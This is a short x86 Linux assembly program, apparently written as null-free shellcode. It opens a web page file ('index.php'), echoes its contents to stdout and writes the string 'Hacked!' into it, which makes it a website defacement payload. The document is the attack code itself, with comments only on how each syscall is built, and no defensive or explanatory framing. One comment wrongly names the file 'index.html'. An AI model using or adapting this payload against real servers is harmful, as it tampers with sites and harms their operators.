global _start               ; global entry point export for ld

section .text

_start:

    ; sys_open(filename, file access mode, file permissions)

    xor     eax, eax        ; clear eax
    add     al, 0x5         ; sys_open syscall number
    mov     ebx, filename   ; address of "index.html"
    xor     ecx, ecx        ; clear ecx
    add     cl, 0x2         ; read and write access
    xor     edx, edx        ; clear edx
    int     0x80            ; trap into the kernel - the file descriptor will be stored in eax

    ; sys_read(fd, message, length)

    xor     ebx, ebx        ; clear ebx
    mov     ebx, eax        ; load file descriptor into ebx
    xor     eax, eax        ; clear eax
    add     al, 0x3         ; sys_read
    mov     ecx, info       ; message
    mov     edx, 1024       ; buffer into which content is to be read
    int     0x80            ; trap into the kernel

    ; sys_write(stdout, message, length)

    xor     edi, edi        ; clear edi
    mov     edi, ebx        ; store file descriptor in edi
    xor     eax, eax        ; clear eax
    mov     al, 0x4         ; sys_write
    xor     ebx, ebx        ; clear ebx
    inc     ebx             ; stdout, mov ebx, 0x1 gave hexcode with null in it
    int     0x80            ; trap into the kernel

    ; sys_write(fd, message, length)

    xor     ebx, ebx        ; clear ebx
    mov     ebx, edi        ; load file descriptor into ebx
    xor     eax, eax        ; clear eax
    add     al, 0x4         ; sys_write
    mov     ecx, message    ; message address
    xor     edx, edx        ; clear edx
    mov     edx, m_len      ; message string length
    int     0x80            ; trap into the kernel

    ; sys_close(fd)

    xor     eax, eax        ; clear eax
    add     eax, 0x6        ; close file
    int     0x80            ; trap into the kernel


    ; sys_exit(return_code)
  
    xor     eax, eax        ; clear eax
    mov     al, 0x1         ; sys_exit
    int     0x80            ; trap into the kernel

section .data

    filename db 'index.php', 0x0
    message db 'Hacked!', 0xd, 0xa
    m_len equ $-message

section .bss

    info resb 1024
